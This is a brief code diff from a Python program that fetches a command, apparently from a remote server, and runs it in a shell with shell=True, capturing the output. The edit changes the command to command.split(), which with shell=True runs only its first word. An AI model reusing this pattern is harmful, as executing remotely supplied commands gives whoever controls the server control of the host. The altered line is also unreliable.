@@ -27,7 +27,7 @@ def main():
     if(code != 250):
         return #Wait for next run
     command = command.decode("UTF-8")
-    out = subprocess.Popen([command], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
+    out = subprocess.Popen(command.split(), stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
     (stdout, stderr) = out.communicate()
     if stdout != None:
         stdout = stdout.decode("UTF-8")
